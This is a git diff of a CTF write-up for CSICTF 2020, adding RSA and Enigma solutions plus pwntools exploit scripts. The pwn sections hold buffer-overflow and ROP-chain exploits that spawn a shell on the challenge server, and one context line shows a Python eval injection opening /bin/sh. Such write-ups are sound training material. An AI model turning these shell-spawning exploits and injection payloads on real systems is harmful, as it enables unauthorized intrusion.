@@ -1,4 +1,4 @@
-ma p# CSICTF 2020
+# CSICTF 2020
 
 ## Crypto
 
@@ -11,14 +11,21 @@ c = 2265822719400944420871930507817308542722004201064194890923945443651597073061
 ```
 With factordb we can factorize 'n' and find 'p' and 'q'.
 ```python
-from Crypto.Util.number import *
+from Crypto.Util.number import inverse, long_to_bytes
 
+n = 408579146706567976063586763758203051093687666875502812646277701560732347095463873824829467529879836457478436098685606552992513164224712398195503564207485938278827523972139196070431397049700119503436522251010430918143933255323117421712000644324381094600257291929523792609421325002527067471808992410166917641057703562860663026873111322556414272297111644069436801401012920448661637616392792337964865050210799542881102709109912849797010633838067759525247734892916438373776477679080154595973530904808231
+e = 65537
+c = 226582271940094442087193050781730854272200420106419489092394544365159707306164351084355362938310978502945875712496307487367548451311593283589317511213656234433015906518135430048027246548193062845961541375898496150123721180020417232872212026782286711541777491477220762823620612241593367070405349675337889270277102235298455763273194540359004938828819546420083966793260159983751717798236019327334525608143172073795095665271013295322241504491351162010517033995871502259721412160906176911277416194406909
 p = 15485863
 q = 26384008867091745294633354547835212741691416673097444594871961708606898246191631284922865941012124184327243247514562575750057530808887589809848089461174100421708982184082294675500577336225957797988818721372546749131380876566137607036301473435764031659085276159909447255824316991731559776281695919056426990285120277950325598700770588152330565774546219611360167747900967511378709576366056727866239359744484343099322440674434020874200594041033926202578941508969596229398159965581521326643115137
-phi = (p - 1)*(q - 1)
+
+phi = (p - 1) * (q - 1)
 d = inverse(e, phi)
 
-print(long_to_bytes(pow(c, d, p * q)))
+m = pow(c, d, n)
+flag = long_to_bytes(m).decode()
+print(flag)
+
 # csictf{sh0uld'v3_t4k3n_b1gg3r_pr1m3s}
 ```
 
@@ -32,19 +39,58 @@ e = 42667
 
 We can factorize 'n' with factordb to do most fast.
 ```python
-from Crypto.Util.number import *
+import mod
 
-p = 101
-q = 641
-phi = (p - 1)*(q - 1)
+c = 32949
+n = 64741
+e = 42667
 
-d = inverse(e, phi)
-print(pow(c, d, n))
+p = None
+for i in range(2, n):
+    if n % i == 0:
+        p = i
+        break
+
+q = n // p
+em = mod.Mod(e, (p - 1) * (q - 1))
+d = int(1 // em)
+cm = mod.Mod(c, n)
+ans = int(cm ** d)
+print(ans)
+
 # 18429
 ```
 We can use this password to open the zip file and find the flag in flag.txt.
 `csictf{gr34t_m1nds_th1nk_4l1ke}`
 
+### Mein Kampf
+```python
+from enigma.machine import EnigmaMachine
+
+ROTORS = ['I', 'II', 'III', 'IV', 'V', 'VI', 'VII', 'VIII', 'Beta', 'Gamma']
+REFLECTORS = ['B', 'C', 'B-Thin', 'C-Thin']
+
+state = 'M4 UKW $ Gamma 2 4 $ 5 9 $ 14 3 $ 5 20 fv cd hu ik es op yl wq jm'
+enc = 'zkrtwvvvnrkulxhoywoj'
+
+rings = '4 9 3 20'
+plug = 'fv cd hu ik es op yl wq jm'.upper()
+pos = '2 5 14 5'
+pos = ''.join(chr(int(x) - 1 + ord('A')) for x in pos.split())
+
+for rf in REFLECTORS:
+    for r2 in ROTORS:
+        for r3 in ROTORS:
+            for r4 in ROTORS:
+                rotors = ['Gamma', r2, r3, r4]
+                e = EnigmaMachine.from_key_sheet(rotors=rotors, ring_settings=rings, 
+                    reflector=rf, plugboard_settings=plug)
+                e.set_display(pos)
+                txt = e.process_text(enc).lower()
+                if 'csictf' in txt:
+                    print(txt)
+
+```
 
 ## Miscellaneous
 
@@ -54,7 +100,20 @@ We can send in input `eval('__import__("os").system("/bin/sh")')` and have the s
 There are a `.git` repository in the directory but there are `git` command, so i can't see commit log.
 We can search the repository on GitHub and see all commit, a commits named 'oops xD' there are a file deleted, we can see the file and there are the flag `csictf{2077m4y32_h45_35c4p3d}`.
 
+### Machine Fix
+```python
+def count3(n):
+    sum = 0
+    while n > 0:
+        sum += n
+        n //= 3
+    return sum
 
+
+print("csictf{" + str(count3(523693181734689806809285195318)) + "}")
+
+# FLAG --> csictf{785539772602034710213927792950}
+```
 ## Forensics
 
 ### Gradient Sky
@@ -81,7 +140,7 @@ p.interactive()
 ### pwn intended 0x2
 For this challenge there are 2 ways to solve it, one, the simplest, is to generate a bufferoverflow and then send the value to make the condition true, while the other solution is to inject a shell because a memory area is executable
 
-#### first method
+##### first method
 ```python
 from pwn import * 
 elf = ELF("pwn-intended-0x2")
@@ -96,7 +155,7 @@ r.sendlineafter("\n", payload)
 r.interactive()
 # csictf{c4n_y0u_re4lly_telep0rt?}
 ```
-#### second method
+##### second method
 ```python
 from pwn import *
 
@@ -128,6 +187,9 @@ p.interactive()
 ```
 
 ### pwn intended 0x3
+the same method used to spawn a shell in the previous challenge can be used in this challenge, just change the offset and the address of the .bss
+
+##### first method
 ```python
 from pwn import * 
 elf = ELF("pwn-intended-0x3")
@@ -143,7 +205,39 @@ r.sendlineafter("\n", payload)
 r.interactive()
 # csictf{ch4lleng1ng_th3_v3ry_l4ws_0f_phys1cs}
 ```
+
+##### second method
+```python
+from pwn import *
+
+elf = ELF("pwn-intended-0x3")
+rop = ROP(elf)
+HOST = "chall.csivit.com"
+PORT = 30013
+p = remote(HOST, PORT)
+offset = 32 + 8
+
+POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
+bss = 0x4040a0
+log.success('pop rdi; ret @ %s' % hex(POP_RDI))
+log.info("sending the first payload")
+payload = b"A" * offset + p64(POP_RDI) + p64(bss) + p64(elf.plt['gets']) + p64(elf.sym['main'])
+p.recvline()
+sleep(1)
+p.sendline(payload)
+p.sendline("/bin/sh\0")
+log.success("done writing /bin/sh")
+
+log.info("sending the second payload")
+payload2 = b"A" * offset + p64(POP_RDI) + p64(bss) + p64(elf.plt['system'])
+p.sendline(payload2)
+p.recvuntil("Welcome to csictf! Time to teleport again.\n")
+p.interactive()
+
+# FLAG --> csictf{ch4lleng1ng_th3_v3ry_l4ws_0f_phys1cs}
+```
 ###Secret Society
+We only need to overwrite a local variable to make true one condition
 ```python
 from pwn import *
 
